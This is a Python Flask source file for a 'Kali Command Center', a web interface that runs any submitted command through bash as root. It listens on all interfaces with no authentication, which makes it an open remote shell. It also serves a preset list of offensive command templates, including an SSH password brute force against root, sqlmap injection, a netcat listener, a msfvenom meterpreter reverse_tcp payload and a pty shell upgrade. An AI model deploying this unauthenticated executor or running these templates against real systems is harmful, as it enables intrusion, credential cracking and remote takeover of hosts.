#!/usr/bin/env python3
"""
Kali Command Center - Web界面远程执行Kali工具
"""
import os
import sys
import json
import uuid
import subprocess
import threading
from datetime import datetime
from flask import Flask, render_template_string, request, Response, stream_with_context
from pathlib import Path

app = Flask(__name__)

COMMANDS_HISTORY = []
TASKS = {}

class CommandTask:
    def __init__(self, task_id, command, shell=True):
        self.task_id = task_id
        self.command = command
        self.output = []
        self.status = 'running'
        self.start_time = datetime.now()
        self.process = None
        
    def run(self):
        try:
            self.process = subprocess.Popen(
                self.command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.PIPE,
                executable='/bin/bash',
                cwd='/root'
            )
            
            for line in iter(self.process.stdout.readline, b''):
                if line:
                    decoded_line = line.decode('utf-8', errors='ignore')
                    self.output.append(decoded_line)
                    yield f"data: {json.dumps({'type': 'output', 'data': decoded_line})}\n\n"
            
            self.process.wait()
            self.status = 'completed'
            exit_code = self.process.returncode
            yield f"data: {json.dumps({'type': 'status', 'status': 'completed', 'exit_code': exit_code})}\n\n"
            
        except Exception as e:
            self.status = 'error'
            self.output.append(f"Error: {str(e)}\n")
            yield f"data: {json.dumps({'type': 'status', 'status': 'error', 'error': str(e)})}\n\n"

@app.route('/')
def index():
    """主界面"""
    with open('/workspace/kali-command-center/templates/index.html', 'r', encoding='utf-8') as f:
        return f.read()

@app.route('/execute', methods=['POST'])
def execute_command():
    """执行命令接口"""
    data = request.get_json()
    command = data.get('command', '').strip()
    
    if not command:
        return Response(json.dumps({'error': 'No command provided'}), 
                       mimetype='application/json', status=400)
    
    task_id = str(uuid.uuid4())
    task = CommandTask(task_id, command)
    TASKS[task_id] = task
    
    COMMANDS_HISTORY.append({
        'id': task_id,
        'command': command,
        'timestamp': datetime.now().isoformat(),
        'status': 'running'
    })
    
    def generate():
        for data in task.run():
            yield data
    
    return Response(
        stream_with_context(generate()),
        mimetype='text/event-stream',
        headers={
            'Cache-Control': 'no-cache',
            'X-Accel-Buffering': 'no'
        }
    )

@app.route('/history', methods=['GET'])
def get_history():
    """获取命令历史"""
    return Response(
        json.dumps(COMMANDS_HISTORY[-50:]),  # 最近50条
        mimetype='application/json'
    )

@app.route('/tools', methods=['GET'])
def get_tools():
    """获取预置工具列表"""
    tools = [
        {'name': 'Nmap Scan', 'command': 'nmap -sV -sC', 'category': 'Reconnaissance'},
        {'name': 'Net Discover', 'command': 'netdiscover -i eth0', 'category': 'Reconnaissance'},
        {'name': 'Dirb Scan', 'command': 'dirb http://target.com', 'category': 'Web'},
        {'name': 'Nikto Scan', 'command': 'nikto -h target.com', 'category': 'Web'},
        {'name': 'SQLMap Basic', 'command': 'sqlmap -u "http://target.com/?id=1" --batch', 'category': 'Web'},
        {'name': 'Hydra SSH', 'command': 'hydra -l root -P passwords.txt ssh://target', 'category': 'Password'},
        {'name': 'John Hash', 'command': 'john --wordlist=rockyou.txt hash.txt', 'category': 'Password'},
        {'name': 'Metasploit', 'command': 'msfconsole', 'category': 'Exploitation'},
        {'name': 'SearchSploit', 'command': 'searchsploit keyword', 'category': 'Exploitation'},
        {'name': 'Aircrack-ng', 'command': 'aircrack-ng -w wordlist.txt capture.cap', 'category': 'Wireless'},
        {'name': 'Wireshark', 'command': 'wireshark &', 'category': 'Sniffing'},
        {'name': 'Tcpdump', 'command': 'tcpdump -i eth0 -n', 'category': 'Sniffing'},
        {'name': 'Burp Suite', 'command': 'burpsuite &', 'category': 'Web'},
        {'name': 'Gobuster', 'command': 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt', 'category': 'Web'},
        {'name': 'Nikto', 'command': 'nikto -h target.com', 'category': 'Web'},
        {'name': 'Netcat Listen', 'command': 'nc -lvp 4444', 'category': 'Networking'},
        {'name': 'Netcat Connect', 'command': 'nc -nv target.com 4444', 'category': 'Networking'},
        {'name': 'Msfvenom', 'command': 'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf', 'category': 'Payload'},
        {'name': 'Python Shell', 'command': 'python3 -c "import pty;pty.spawn(\'/bin/bash\')"', 'category': 'Shells'},
        {'name': 'System Info', 'command': 'uname -a && cat /etc/os-release && ifconfig', 'category': 'System'},
        {'name': 'Services', 'command': 'systemctl list-units --type=service --state=running', 'category': 'System'},
        {'name': 'Netstat', 'command': 'netstat -tulnp', 'category': 'Networking'},
        {'name': 'SS', 'command': 'ss -tulnp', 'category': 'Networking'},
        {'name': 'PS', 'command': 'ps aux', 'category': 'System'},
        {'name': 'Top', 'command': 'top -bn1', 'category': 'System'},
    ]
    return Response(json.dumps(tools), mimetype='application/json')

@app.route('/task/<task_id>', methods=['GET'])
def get_task(task_id):
    """获取特定任务状态和输出"""
    task = TASKS.get(task_id)
    if not task:
        return Response(json.dumps({'error': 'Task not found'}), 
                       mimetype='application/json', status=404)
    
    return Response(
        json.dumps({
            'task_id': task.task_id,
            'status': task.status,
            'output': task.output,
            'start_time': task.start_time.isoformat()
        }),
        mimetype='application/json'
    )

@app.route('/stop/<task_id>', methods=['POST'])
def stop_task(task_id):
    """停止正在运行的任务"""
    task = TASKS.get(task_id)
    if not task:
        return Response(json.dumps({'error': 'Task not found'}), 
                       mimetype='application/json', status=404)
    
    if task.process:
        task.process.terminate()
        task.status = 'stopped'
        return Response(json.dumps({'status': 'stopped'}), 
                       mimetype='application/json')
    
    return Response(json.dumps({'error': 'No process to stop'}), 
                   mimetype='application/json', status=400)

def print_banner():
    """打印启动信息"""
    print("\n" + "="*60)
    print("  🔥 Kali Command Center - Web管理界面")
    print("="*60)
    print("  ⚡ 实时命令执行 | 远程工具管理")
    print("="*60 + "\n")

if __name__ == '__main__':
    print_banner()
    
    host = '0.0.0.0'
    port = 5000
    
    print(f"[📡] 服务启动中...")
    print(f"[🌐] 访问地址: http://<kali-ip>:{port}")
    print(f"[💻] 本机访问: http://localhost:{port}")
    print(f"\n[⏹]  按 Ctrl+C 停止服务\n")
    
    # 创建templates目录
    templates_dir = Path('/workspace/kali-command-center/templates')
    templates_dir.mkdir(exist_ok=True)
    
    app.run(
        host=host, 
        port=port, 
        debug=False,
        threaded=True,
        use_reloader=False
    )
